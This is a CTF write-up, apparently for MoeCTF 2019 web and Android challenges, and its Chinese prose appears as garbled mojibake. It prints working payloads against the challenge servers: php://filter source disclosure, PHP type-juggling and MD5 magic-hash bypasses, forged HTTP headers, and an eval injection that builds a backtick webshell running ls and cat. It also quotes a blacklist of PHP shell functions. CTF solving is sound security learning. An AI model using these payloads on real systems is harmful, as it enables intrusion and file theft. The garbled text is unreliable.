<p>å»ç½‘ä¸Šæ‰¾äº†ä¸ªå«<code>HackBar</code>çš„ä¸œè¥¿, ç„¶åå°±<code>post</code>äº†&hellip;</p>
<p>ä¸è¿‡åæ¥ç”¨è„šæœ¬çš„åŠæ³•, æ‹“å±•æ€§é«˜ä¸€ç‚¹:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10001/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="introducing-web">Introducing Web</h3>
<p>æ‰“å¼€ç½‘é¡µ, ç„¶åæŒ‰F12, ç„¶å..å°±æ²¡æœ‰ç„¶åäº†..</p>
<h3 id="easy-limitation">Easy Limitation</h3>
<p>æ‰“å¼€ç½‘é¡µ, ä¿å­˜åˆ°æœ¬åœ°, æ‰“å¼€HTML, æŠŠä¸‹é¢è¿™å¥:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;key&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;14&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;åªéœ€è¦è¾“å…¥msc_1s_Gre@tå³å¯è·å–flag&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>é‡Œçš„<code>maxlength</code>æ”¹æˆ15æˆ–è€…æ›´å¤§çš„æ•°, ç„¶åæœ¬åœ°æµè§ˆå™¨æ‰“å¼€æ”¹å¥½çš„html, è¾“å…¥, æäº¤, æ‹¿åˆ°<code>flag</code>.</p>
<h3 id="procotol">Procotol</h3>
<p>ä»phpçš„å®˜æ–¹æ–‡æ¡£é‡Œè¯»äº†å¥½ä¹…&hellip;ç„¶åæ‹¼å‡ºæ¥è¿™ä¹ˆä¸€å¥:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://39.108.11.206:10003/?file=php://filter/read=convert.base64-encode/resource=./index.php
</span></span></code></pre></div><p>æµè§ˆå™¨æ‰“å¼€åèƒ½çœ‹åˆ°ä¸€ä¸²<code>base64</code>ä¸², å¤åˆ¶ä¸‹æ¥è§£ç :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">error_reporting(0);
</span></span></span><span class="line"><span class="cl"><span class="cp">echo &#39;&lt;p&gt;the flag was put in the index.php, can you get it?&lt;/p&gt;&#39;;
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">$file=$_GET[&#39;file&#39;];
</span></span></span><span class="line"><span class="cl"><span class="cp">include($file);
</span></span></span><span class="line"><span class="cl"><span class="cp">//moectf{YoU_g0t_f1@g}
</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
</span></span></code></pre></div><p>ç„¶åå°±æ‹¿åˆ°<code>flag</code>äº†&hellip;</p>
<p>è¯´æ¥è¿™ç§æŠŠæºç æ¢æˆ<code>base64</code>å†è¾“å‡ºé˜²æ­¢è¢«æ‰§è¡Œçš„æ–¹æ³•çœŸéªšå•Š..</p>
<h3 id="restrictions">Restrictions</h3>
<p>æœç´¢å¼•æ“ä¼šè¯»å–ç«™ç‚¹ä¸‹çš„<code>robots.txt</code>æ¥åˆ¤æ–­çˆ¬å–å“ªäº›é¡µé¢. ç„¶åæˆ‘ä»¬æ‰“å¼€<code>https://moectf.cn/robots.txt</code>, å‘ç°æç¤ºæœ‰ä»€ä¹ˆè„šæœ¬è¢«æ‰§è¡Œäº†åˆ æ‰äº†<code>flag</code>&hellip;</p>
<p>æ‰“å¼€è®¾ç½®ç¦ç”¨JSè„šæœ¬, åˆ·æ–°ç½‘é¡µ, F12, åœ¨æºä»£ç é‡Œçœ‹è§<code>flag</code>&hellip;</p>
<h3 id="æ˜¯æ—¶å€™å±•ç¤ºåå…«å¹´å•èº«çš„æ‰‹é€Ÿäº†">æ˜¯æ—¶å€™å±•ç¤ºåå…«å¹´å•èº«çš„æ‰‹é€Ÿäº†</h3>
<p>è¿™é“é¢˜è¦ç”¨åˆ°<code>WireShark</code>&hellip;ç„¶åç‚¹å¼€WireShark, æ‰“å¼€ç«¯å£ç„¶ååˆ·æ–°é¡µé¢, ç„¶ååœ¨æ•è·çš„åˆ—è¡¨é‡Œé¢æ‰¾ä¸€ä¸ªHTTP 302, ç„¶ååŒå‡»æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯, å°±èƒ½æ‰¾åˆ°<code>flag</code>äº†.</p>
<h3 id="è‹±å›½äºº">è‹±å›½äºº</h3>
<p>è¿™é“é¢˜å¾ˆç§€â€¦. ç”¨<code>nslookuptool</code>çš„åœ¨çº¿æŸ¥è¯¢ç½‘ç«™å¯ä»¥æŸ¥åˆ°<code>region.challenge.moectf.cn</code>çš„å…¨çƒ<code>dns</code>ä¿¡æ¯, ç„¶åæ‰¾åˆ°äº†åŸŸååœ¨è‹±å›½è¢«è§£æçš„åœ°å€, ç„¶åä¿®æ”¹ä¸€ä¸‹<code>hosts</code>, å”±è·³rapç¯®çƒ+F5, å°±æ‹¿åˆ°<code>flag</code>äº†.</p>
<h3 id="amazing_eval">Amazing_Eval</h3>
<p>äº†è§£äº†ä¸€ä¸‹<code>eval()</code>å‡½æ•°..</p>
<p>ç„¶åæ‰“å¼€<code>http://39.108.11.206:10006/?cmd=â€˜echo â€œ$flagâ€â€™</code>å°±å¥½äº†.</p>
<h3 id="ä»Šå¤©ä½ å¤‡ä»½äº†å˜›">ä»Šå¤©ä½ å¤‡ä»½äº†å˜›</h3>
<p>è¿™é“é¢˜ä¸Šç½‘å¿…åº”äº†ä¸€ä¸‹, ç„¶åæ‰“å¼€<code>http://39.108.11.206:10011/index.php.swp</code>, å°±æ‹¿åˆ°<code>flag</code>äº†.</p>
<h3 id="php-å¼±ç±»å‹">PHP å¼±ç±»å‹</h3>
<p>æˆ‘çœŸçš„æƒ³åæ§½PHPä¸æ„§æ˜¯è¢«éª‚æˆå…¨ä¸–ç•Œæœ€æ‡’çƒ‚çš„è¯­è¨€&hellip;</p>
<p><code>http://39.108.11.206:10005/?a=&quot;0â€</code></p>
<p>phpåˆ¤æ–­ç›¸ç­‰æ—¶, å­—ç¬¦ä¸²ä¼šè¢«è§£é‡Šæˆ0. æ‰“å¼€ä¸Šé¢ç½‘å€æ‹¿åˆ°<code>flag</code>.</p>
<h3 id="php_md5">PHP_md5()</h3>
<p>å“‡å¡phpæ˜¯çœŸçš„ä¸å®‰å…¨&hellip;å¿…åº”äº†ä¸€ä¸‹phpçš„MD5æ¼æ´, ç„¶åæ‰“å¼€<code>http://39.108.11.206:10007/?username=240610708&amp;passwd=QNKCDZO</code>, å°±æ‹¿åˆ°äº†<code>flag</code>: <code>moectf{You_UnderStAnd_mD5_betTer!}</code></p>
<p>è¿™æ˜¯å› ä¸º<code>240610708</code>å’Œ<code>QNKCDZO</code>çš„MD5()è®¡ç®—ç»“æœç«Ÿç„¶æ˜¯ä¸€æ ·çš„!</p>
<h3 id="ç¥å¥‡çš„æ­£åˆ™è¡¨è¾¾å¼">ç¥å¥‡çš„æ­£åˆ™è¡¨è¾¾å¼</h3>
<p>å°å°å­¦äº†ä¸‹æ­£åˆ™è¡¨è¾¾å¼, ç„¶åæ”¹äº†ä¸€ä¸‹ä¹‹å‰postç”¨çš„è„šæœ¬:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="s2">&#34;aflagdddd/6/:skey&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10009/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span></code></pre></div><p>æˆåŠŸé€šè¿‡.</p>
<h3 id="å¤´">å¤´</h3>
<p>è¿™é¢˜çœŸçš„ç‹ &hellip;ç®—äº†è¦æ–‡æ˜&hellip;</p>
<p>ç”¨<code>curl</code>è¿è¯•äº†å¥½å‡ æ¬¡ç»ˆäºè¿‡äº†:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ curl --header &#34;Cookie: login=true&#34; --header &#34;User-Agent: PowerPC&#34; --header &#34;Accept: application/flag&#34; -v -i http://47.101.32.101:10010/
</span></span></code></pre></div><p>å°±æ˜¯æŒ‰ç…§ç½‘é¡µçš„æç¤ºæ”¹HTTPè¯·æ±‚å¤´å°±å¥½äº†.</p>
<p><code>flag</code>: <code>moectf{M0m_I_c4n_m0dify_HTTP_H3aders!}</code></p>
<p>è¿™ä¸ª<code>flag</code>å†™çš„ä¹Ÿè®©äººå¾ˆæƒ³åæ§½&hellip;.</p>
<h3 id="stronger_php">stronger_php</h3>
<p>è¿™ä¸ªç«Ÿç„¶åˆ¤æ–­md5==sha1â€¦&hellip;.</p>
<p>ç”¨æ•°ç»„ç»•è¿‡, æµè§ˆå™¨æ‰“å¼€<code>http://39.108.11.206:10008/?a[]&amp;b[]=123123</code></p>
<p>å¾—åˆ°<code>flag</code>: <code>moectf{Y0u_can_st1ll_defeat_m3}</code></p>
<h3 id="ç»ˆæhttpè¯·æ±‚å¤´">ç»ˆæHTTPè¯·æ±‚å¤´</h3>
<p>æˆ‘!!!!! æƒ³æ€äºº&hellip;</p>
<p>å…ˆæŒ‚å‡ºæ¥æˆ‘çš„ç‹—è¡€å†ç¨‹ğŸ™ƒ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">## ä¸Šé¢çœç•¥2232è¡Œå°è¯•çš„ä»£ç 
</span></span><span class="line"><span class="cl">rever@DS-10001-RX MINGW64 ~
</span></span><span class="line"><span class="cl">$ curl --header &#34;Referer: www.xidian.edu.cn&#34; --header &#34;User-Agent: moectf_browser&#34; --header &#34;X-Forwarded-For: 127.0.0.1&#34; --header &#34;Cookie: xduer&#34; --header &#34;Accept: PHP&#34; --header &#34;Accept-Encoding: UTF-8&#34; --header &#34;Accept-Language: zh-CN&#34; -v -i http://39.108.11.206:10012/
</span></span><span class="line"><span class="cl">*   Trying 39.108.11.206...
</span></span><span class="line"><span class="cl">* TCP_NODELAY set
</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class="line"><span class="cl">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 39.108.11.206 (39.108.11.206) port 10012 (#0)
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 39.108.11.206:10012
</span></span><span class="line"><span class="cl">&gt; Referer: www.xidian.edu.cn
</span></span><span class="line"><span class="cl">&gt; User-Agent: moectf_browser
</span></span><span class="line"><span class="cl">&gt; X-Forwarded-For: 127.0.0.1
</span></span><span class="line"><span class="cl">&gt; Cookie: xduer
</span></span><span class="line"><span class="cl">&gt; Accept: PHP
</span></span><span class="line"><span class="cl">&gt; Accept-Encoding: UTF-8
</span></span><span class="line"><span class="cl">&gt; Accept-Language: zh-CN
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">&lt; Date: Fri, 06 Sep 2019 14:41:00 GMT
</span></span><span class="line"><span class="cl">&lt; Server: Apache/2.4.7 (Ubuntu)
</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/5.5.9-1ubuntu4.14
</span></span><span class="line"><span class="cl">&lt; Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">&lt; Content-Length: 443
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html
</span></span><span class="line"><span class="cl">&lt;
</span></span><span class="line"><span class="cl">{ [443 bytes data]
</span></span><span class="line"><span class="cl">100   443  100   443    0     0   3141      0 --:--:-- --:--:-- --:--:--  3141HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">Date: Fri, 06 Sep 2019 14:41:00 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.7 (Ubuntu)
</span></span><span class="line"><span class="cl">X-Powered-By: PHP/5.5.9-1ubuntu4.14
</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">Content-Length: 443
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">First of all, you must come from XiDian University&lt;br&gt;Second, you have to use moectf_browser&lt;br&gt;Third, you have to visit from the localhost&lt;br&gt;Fourth, your identity must be xduer&lt;br&gt;Fifth, client can only accept PHP documents&lt;br&gt;Sixth, we only allow UTF-8 encoding&lt;br&gt;Finally, we are only allowed to use Chinese.&lt;br&gt;Congratulations on having a good understanding of HTTP HEADERS and finally getting flag:&lt;br&gt;moectf{Reward_y0u_For_per3everAnce}
</span></span><span class="line"><span class="cl">* Connection #0 to host 39.108.11.206 left intact
</span></span></code></pre></div><p>è¯•åˆ°æœ€åä¸€æ­¥çœ‹è§<code>flag</code>é‡Œçš„é‚£ä¸ª<code>perseverance</code>æˆ‘å½“æ—¶å°±æƒ³ä»å››æ¥¼è·³ä¸‹å»&hellip;</p>
<h3 id="æœé²œäºº">æœé²œäºº</h3>
<p>æœé²œäºº! wd**d, æˆ‘å»å“ªå„¿æ‰¾æœé²œdnså•ŠQAQ</p>
<p>å¿…åº”äº†å¥½ä¹…æ‰¾åˆ°ä¸€ä¸ªé˜¿é‡Œäº‘çš„EDNS-CLIENT-SUBNETçš„ä½¿ç”¨ä»‹ç», åœ¨æˆ‘çš„<code>Open SUSE Tumbleweed</code>ä¸­è¿è¡Œå¦‚ä¸‹:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget ftp://ftp.isc.org/isc/bind9/9.9.3/bind-9.9.3.tar.gz
</span></span><span class="line"><span class="cl">$ tar xf bind-9.9.3.tar.gz
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> bind-9.9.3
</span></span><span class="line"><span class="cl">$ wget http://wilmer.gaa.st/edns-client-subnet/bind-9.9.3-dig-edns-client-subnet-iana.diff
</span></span><span class="line"><span class="cl">$ yum -y install patch
</span></span><span class="line"><span class="cl">$ patch -p0 &lt; bind-9.9.3-dig-edns-client-subnet-iana.diff
</span></span><span class="line"><span class="cl">$ ./configure --without-openssl
</span></span><span class="line"><span class="cl">$ make
</span></span></code></pre></div><p>ç„¶åç»ˆç«¯æ‰§è¡Œ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /bin/dig/dig @8.8.8.8 region.challenge.moectf.cn +client<span class="o">=</span>175.45.176.68
</span></span></code></pre></div><p><code>edns</code>å…¶å®å°±æ˜¯æŸ¥è¯¢<code>dns</code>æœåŠ¡å™¨çš„æ—¶å€™æ‰‹åŠ¨å‘ŠçŸ¥<code>dns</code>ä½ æ˜¯å“ªé‡Œçš„äºº, ç„¶å<code>dns</code>å°±ä¼šè¿”å›ä¸€ä¸ªä½ è¯¥è®¿é—®çš„åœ°å€. å¾—åˆ°æœé²œè§£æçš„IPä¹‹å, è€æ–¹æ³•ä¿®æ”¹<code>hosts</code>, å°±å¾—åˆ°äº†æœé²œäººçš„<code>flag</code>.</p>
<p>ä»ä¼é¹…å¤§ä½¬çš„åšå®¢ä¸Šæ‰¾åˆ°äº†å…³äºednsçš„è¯¦ç»†è§£é‡Š, ç°åœ¨å¾ˆä¸è¦è„¸çš„å¼•ç”¨è¿‡æ¥:</p>
<blockquote>
<h3 id="1ä»€ä¹ˆæ˜¯edns"><em>1ã€ä»€ä¹ˆæ˜¯EDNSï¼Ÿ</em></h3>
<p>â€‹    EDNSå°±æ˜¯åœ¨éµå¾ªå·²æœ‰çš„DNSæ¶ˆæ¯æ ¼å¼çš„åŸºç¡€ä¸Šå¢åŠ ä¸€äº›å­—æ®µï¼Œæ¥æ”¯æŒæ›´å¤šçš„DNSè¯·æ±‚ä¸šåŠ¡ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåƒDNSæœåŠ¡å™¨è¿™æ ·ä¸€ä¸ªå¤§å‹ä¸”å¹¿æ³›åº”ç”¨çš„ç³»ç»Ÿè½¯ä»¶ï¼Œæ–°å¢åŠ æ‰©å±•åè®®çš„æ—¶å€™ä¸€å®šè¦è€ƒè™‘åˆ°å‘åå…¼å®¹æ€§(backward compatibility)ï¼Œå³ä½ å¢åŠ äº†ä½ è¿™ä¸ªç‰¹æ€§çš„æ¶ˆæ¯ä¼ è¾“ç»™æœªæ”¯æŒè¯¥ç‰¹æ€§çš„æœåŠ¡å™¨æ—¶ï¼Œåè€…ä¾ç„¶èƒ½æ­£ç¡®å¤„ç†ã€‚</p>
<h3 id="2ä¸ºä»€ä¹ˆè¦æœ‰-edns">2ã€ä¸ºä»€ä¹ˆè¦æœ‰ EDNSï¼Ÿ</h3>
<p>â€‹    RFC2671ä¸­æŒ‡å‡ºEDNSè¢«æå‡ºæ¥çš„å‡ ä¸ªç†ç”±ï¼š</p>
<p>â€‹        1ï¼‰DNSåè®®å¤´éƒ¨çš„ç¬¬äºŒä¸ª16å­—èŠ‚ä¸­éƒ½å·²ç»è¢«ç”¨çš„å·®ä¸å¤šäº†ï¼Œéœ€è¦æ·»åŠ æ–°çš„è¿”å›ç±»å‹(RCODE)å’Œæ ‡è®°(FLAGS)æ¥æ”¯æŒå…¶ä»–éœ€æ±‚ï¼›</p>
<p>â€‹        2ï¼‰åªä¸ºæ ‡ç¤ºdomainç±»å‹çš„æ ‡ç­¾åˆ†é…äº†ä¸¤ä½ï¼Œç°åœ¨å·²ç»ç”¨æ‰äº†ä¸¤ä½ï¼ˆ00æ ‡ç¤ºå­—ç¬¦ä¸²ç±»å‹ï¼Œ11è¡¨ç¤ºå‹ç¼©ç±»å‹ï¼‰ï¼Œåé¢å¦‚æœæœ‰æ›´å¤šçš„æ ‡ç­¾ç±»å‹åˆ™æ— æ³•æ”¯æŒï¼›</p>
<p>â€‹        3ï¼‰å½“åˆDNSåè®®ä¸­è®¾è®¡çš„ç”¨UDPåŒ…ä¼ è¾“æ—¶åŒ…å¤§å°é™åˆ¶ä¸º512å­—èŠ‚ï¼Œç°åœ¨å¾ˆå¤šä¸»æœºå·²ç»å…·å¤‡é‡ç»„å¤§æ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œæ‰€ä»¥è¦æœ‰ä¸€ç§æœºåˆ¶æ¥å…è®¸DNSè¯·æ±‚æ–¹é€šçŸ¥DNSæœåŠ¡å™¨è®©å…¶è¿”å›å¤§åŒ…ï¼›</p>
<p>â€‹        ä»¥åæˆ‘ä»¬ä¼šçœ‹åˆ°ï¼ŒDNSSECæœºåˆ¶å’Œedns-client-subnetæœºåˆ¶ç­‰éƒ½éœ€è¦æœ‰EDNSçš„æ”¯æŒã€‚</p>
<h3 id="3edns-çš„å†…å®¹æ˜¯ä»€ä¹ˆ"><em>3ã€EDNS çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</em></h3>
<p>â€‹        æ€æ ·åœ¨DNSæ¶ˆæ¯åè®®çš„åŸºç¡€ä¸Šå†å¢åŠ ä¸€äº›å­—æ®µå‘¢ï¼Ÿä¸ºäº†ä¿æŒå‘åå…¼å®¹æ€§ï¼Œæ›´æ”¹å·²æœ‰çš„DNSåè®®æ ¼å¼æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åªèƒ½åœ¨DNSåè®®çš„æ•°æ®éƒ¨åˆ†ä¸­åšæ–‡ç« ã€‚</p>
<p>â€‹        æ‰€ä»¥ï¼ŒEDNSä¸­å¼•å…¥äº†ä¸€ç§æ–°çš„ä¼ªèµ„æºè®°å½•OPTï¼ˆResource Recordï¼‰ï¼Œä¹‹æ‰€ä»¥å«åšä¼ªèµ„æºè®°å½•æ˜¯å› ä¸ºå®ƒä¸åŒ…å«ä»»ä½•DNSæ•°æ®ï¼ŒOPT RRä¸èƒ½è¢«cacheã€ä¸èƒ½è¢«è½¬å‘ã€ä¸èƒ½è¢«å­˜å‚¨åœ¨zoneæ–‡ä»¶ä¸­ã€‚OPTè¢«æ”¾åœ¨DNSé€šä¿¡åŒæ–¹ï¼ˆrequestorå’Œresponsorï¼‰DNSæ¶ˆæ¯çš„Additional dataåŒºåŸŸä¸­ã€‚</p>
<p>è½¬è‡ª èµ¤é“ä¼é¹…â„¢çš„åšå®¢</p>
</blockquote>
<h3 id="dynamic">Dynamic</h3>
<p>è¿™é“é¢˜æ˜¯è€ƒæ€ç»´å®šåŠ¿çš„&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="err">&lt;</span>?php
</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">error_reporting(0);
</span></span><span class="line"><span class="cl">$blacklist = [&#34;system&#34;, &#34;ini_set&#34;, &#34;exec&#34;, &#34;scandir&#34;, &#34;shell_exec&#34;, &#34;proc_open&#34;, &#34;error_log&#34;, &#34;ini_alter&#34;, &#34;ini_set&#34;, &#34;pfsockopen&#34;, &#34;readfile&#34;, &#34;echo&#34;, &#34;file_get_contents&#34;, &#34;readlink&#34;, &#34;symlink&#34;, &#34;popen&#34;, &#34;fopen&#34;, &#34;file&#34;, &#34;fpassthru&#34;];
</span></span><span class="line"><span class="cl">$blacklist = array_merge($blacklist, get_defined_functions()[&#39;internal&#39;]);
</span></span><span class="line"><span class="cl">foreach($blacklist as $i){
</span></span><span class="line"><span class="cl">    if(stristr($_GET[cmd], $i)!==false){
</span></span><span class="line"><span class="cl">        die(&#39;hack&#39;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">eval($_GET[cmd]);
</span></span></code></pre></div><p>æ‰“å¼€é¢˜ç›®çš„ä»£ç é•¿è¿™æ ·, èƒ½çœ‹åˆ°<code>blacklist</code>é‡Œé¢ç¦ç”¨äº†å¥½å¤šç”¨æ¥è¾“å‡ºå’Œæ“ä½œæ–‡ä»¶çš„å‡½æ•°&hellip; æ€ä¹ˆåŠ? äºæ˜¯æˆ‘ç ”ç©¶äº†å¥½ä¹…<code>PHP</code>çš„æ¼æ´, åŒ…æ‹¬<code>stristr()</code>çš„æ¼æ´, æœ€åé™¤äº†å‘ç°<code>print()</code>å‡½æ•°è¿˜èƒ½ç”¨ä¹‹å¤–ä»€ä¹ˆéƒ½åšä¸äº†&hellip;</p>
<p>ä½†æ˜¯å’§, ç»è¿‡å¤§å“¥çš„ç‚¹æ‹¨, æˆ‘æ˜ç™½äº†, <code>PHP</code>çš„å‡½æ•°ä¸èƒ½ç”¨, ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨<code>Linux</code>çš„æŒ‡ä»¤å‘€!!!</p>
<p>äºæ˜¯æˆ‘ä»¬åˆ†æä»£ç , å‘ç°é¦–å…ˆæ˜¯æ²¡æœ‰é™¤äº†<code>cmd</code>ä¹‹å¤–çš„å˜é‡ä¾›æˆ‘ä»¬ä½¿ç”¨çš„, æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªæ–°çš„å˜é‡. è¿™æ–°çš„å˜é‡çš„åå­—æˆ‘ä»¬æš‚ä¸”å«<code>str</code>å¥½äº†, åæ­£ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…³ç³».. ( å› ä¸ºæˆ‘å¤§å“¥è¿™ä¹ˆå–çš„åå­— )</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦è¯»å–è¿™ä¸ª<code>str</code>é‡Œçš„ä¸œè¥¿, ç„¶å<code>print</code>å‡ºæ¥. æœ€åè·Ÿä¸Š<code>id</code>çš„å†…å®¹..</p>
<p>ä½†æ˜¯æ€ä¹ˆè°ƒç”¨<code>Linux</code>çš„å‡½æ•°å‘¢.?</p>
<p>è¿™è¦æåˆ°<code>PHP</code>é‡Œé¢åˆä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿: åå¼•å·: &lsquo;`&rsquo;.</p>
<p><code>PHP</code>ä¼šæŠŠåŒ…å«åœ¨åå¼•å·é‡Œé¢çš„ä¸œè¥¿å½“æˆ<code>Shell</code>æŒ‡ä»¤æ‰§è¡Œ.</p>
<p>æ‰€ä»¥, æˆ‘ä»¬å°±å¯ä»¥å¿«ä¹çš„æ„å»ºä¸€å¥è¯æœ¨é©¬å•¦!</p>
<p>Like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">ls</span>
</span></span></code></pre></div><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨<code>ls</code>æŒ‡ä»¤æ¥æŸ¥çœ‹æœåŠ¡å™¨å½“å‰æ–‡ä»¶å¤¹é‡Œéƒ½æœ‰äº›ä»€ä¹ˆä¸œä¸œ..</p>
<p>ç„¶åæˆ‘ä»¬çœ‹è§äº†ä¸¤ä¸ªæ–‡ä»¶, ä¸€ä¸ªæ˜¯<code>4f5f6c3be6ab7cc59dabf9ff7f2b248a </code> å¦ä¸€ä¸ªæ˜¯<code>index.php</code>..</p>
<p><code>flag</code>è‡ªç„¶ä¸å¯èƒ½å­˜åœ¨<code>index.php</code>é‡Œå•¦, æˆ‘ä»¬ç”¨<code>Linux</code>é‡Œçš„<code>cat</code>æŒ‡ä»¤æ¥æŸ¥çœ‹é‚£ä¸ªä¹±ç æ–‡ä»¶é‡Œæ˜¯äº›ä»€ä¹ˆä¸œè¥¿:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">cat</span><span class="o">+</span><span class="mi">4</span><span class="nx">f5f6c3be6ab7cc59dabf9ff7f2b248a</span>
</span></span></code></pre></div><p>ç„¶åå°±æ‹¿åˆ°<code>flag</code>å•¦&hellip;</p>
<p><code>flag</code>: <code>moectf{PLEASE_USE_disable_function!!!!!!}</code></p>
<h2 id="android">Android</h2>
<h3 id="android_signin">Android_Signin</h3>
<p>æ‰‹æœºä¸‹è½½, æ‰“å¼€, æ‹¿flag.</p>
<h3 id="clickit">ClickIt</h3>
<p>æˆ‘æ•™ä½ ä»¬ç‰©ç†åšæ³•!</p>
<p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ª2.8Vç”µåŠ¨æœº, ç„¶åæ‰¾åˆ°ä¸€æ ¹æ£‰ç­¾, å¯ä»¥é€šè¿‡å¯¼çº¿æˆ–è€…é”¡ç®”çš„æ–¹æ³•è®©å…¶å¯ä»¥è¢«æ‰‹æœºç”µå®¹å±è¯†åˆ«, ç„¶åæ”¾åœ¨ä¸€ä¸ªæ”¯æ¶ä¸Š.</p>
